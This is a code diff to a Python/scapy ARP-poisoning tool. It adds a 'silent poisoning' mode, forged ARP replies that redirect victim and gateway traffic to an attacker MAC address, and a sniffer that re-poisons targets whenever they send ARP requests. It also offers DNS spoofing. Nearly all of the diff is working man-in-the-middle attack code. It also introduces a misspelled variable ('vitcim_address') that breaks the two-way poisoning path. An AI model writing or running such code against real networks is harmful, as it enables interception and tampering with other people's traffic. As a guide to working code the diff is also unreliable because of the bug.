@@ -31,6 +31,7 @@ def get_arguments():
     parser.add_argument("-i", "--iface", dest="iface", default="enp0s3", help="Interface [default: %(default)s]")
 
     parser.add_argument("-o", "--oneway", dest="oneway", action="store_true", help="Do not poison gateways")
+    parser.add_argument("-z", "--silent", dest="silent", action="store_true", help="Enable silent poisoning")
 
     parser.add_argument("-d", "--dns", dest="dns-spoof", action='store_true', help="use this argument if you want to use dns-spoof")
     parser.add_argument("-u", "--url", dest="urls", nargs="+", help="Array of URLs to spoof with as last item the the ip to redirect to")
@@ -46,25 +47,25 @@ options = get_arguments()
 
 
 def get_mac(ip):
-    arp_request_broadcast = build_ether("ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=ip)  # Broadcast MAC address: ff:ff:ff:ff:ff:ff
+    arp_request_broadcast = build_ether("ff:ff:ff:ff:ff:ff")/ARP(pdst=ip)  # Broadcast MAC address: ff:ff:ff:ff:ff:ff
     # Get list with answered hosts
     answered_list = srp(arp_request_broadcast, timeout=1, verbose=False, iface=options.iface)[0]
     return answered_list[0][1].hwsrc if len(answered_list) > 0 else 0
 
 
 def build_ether(mac):
-    ether = scapy.Ether()
+    ether = Ether()
     ether.src = mac
     return ether
 
 
 def build_icmp_echo():
-    icmp = scapy.ICMP()
+    icmp = ICMP()
     return icmp
 
 
 def build_arp(victim_ip, from_ip, from_mac, attacker_mac, mode):
-    arp = scapy.ARP()
+    arp = ARP()
     arp.hwsrc = attacker_mac
     arp.psrc = victim_ip
     arp.hwdst = from_mac
@@ -75,7 +76,7 @@ def build_arp(victim_ip, from_ip, from_mac, attacker_mac, mode):
 
 def forge_l2_ping(victim_ip, from_ip, from_mac):
     # ping = build_ether(macVictim) / IP(dst=ipVictim) / build_icmp_echo()
-    ping = scapy.Ether(src=ATTACKER_MAC, dst=from_mac)/scapy.IP(src=victim_ip, dst=from_ip)/scapy.ICMP()
+    ping = Ether(src=ATTACKER_MAC, dst=from_mac)/IP(src=victim_ip, dst=from_ip)/ICMP()
     return ping
 
 
@@ -86,6 +87,8 @@ def forge_arp(victim_ip, from_ip, from_mac, attacker_mac, mode):
 
 
 def arp_poison(targets, gateways):
+    i = 0
+
     while True:
         try:
             print("[*] Sending ARP poison packets...") if options.verbose else 0
@@ -103,40 +106,47 @@ def arp_poison(targets, gateways):
                         sendp(icmpM, iface=options.iface, verbose=options.verbose)
 
                     # Create ARP poison packet to send all packets from from_address to this pc if packet is for victim
-                    arp = forge_arp(victim_address.ip, from_address.ip, from_address.mac, ATTACKER_MAC, 2)
+                    arp = forge_arp(from_address.ip, victim_address.ip, victim_address.mac, ATTACKER_MAC, 2)
                     sendp(arp, iface=options.iface, verbose=options.verbose)
 
-                    arp[scapy.ARP].op = 1
+                    arp[ARP].op = 1
                     sendp(arp, iface=options.iface, verbose=options.verbose)
                     if(not options.oneway):
-                        arpM = forge_arp(from_address.ip, victim_address.ip, victim_address.mac, ATTACKER_MAC, 2)
+                        arpM = forge_arp(vitcim_address.ip, from_address.ip, from_address.mac, ATTACKER_MAC, 2)
                         sendp(arpM, iface=options.iface, verbose=options.verbose)
 
-                        arpM[scapy.ARP].op = 1
+                        arpM[ARP].op = 1
                         sendp(arpM, iface=options.iface, verbose=options.verbose)
 
             print("[*] end of ARP storm...") if options.verbose else 0
+            if(options.silent and i >=2):
+                print("Initial poison complete")
+                return
+
         except Exception as e:
             print(e, traceback.format_exc())
             sys.exit(0)
 
         time.sleep(ARP_POISON_WARM_UP)
+        i += 1
 
 
 def poison_confirm(targets, gateways):
     while True:
-        pkt = sniff(filter="arp", count=1)
+        pkt = sniff(filter="arp", iface=options.iface, count=1)[0]
         for target in targets:
-            if(pkt[scapy.ARP].psrc == target.ip):
+            if(pkt[ARP].psrc == target.ip):
                 for gateway in gateways:
-                    if(pkt[scapy.ARP].pdst == gateway.ip):
+                    if(pkt[ARP].pdst == gateway.ip):
+                        print("ARP broadcast detected")
+                        pkt.show()
                         arpReply = forge_arp(gateway.ip, target.ip, target.mac, ATTACKER_MAC, 2)
                         sendp(arpReply, iface=options.iface, verbose=options.verbose)
 
             if(not options.oneway):
-                if(pkt[scapy.ARP].pdst == target.ip):
+                if(pkt[ARP].pdst == target.ip):
                     for gateway in gateways:
-                        if(pkt[scapy.ARP].psrc == gateway.ip):
+                        if(pkt[ARP].psrc == gateway.ip):
                             arpReply = forge_arp(target.ip, gateway.ip, gateway.mac, ATTACKER_MAC, 2)
                             sendp(arpReply, iface=options.iface, verbose=options.verbose)
 
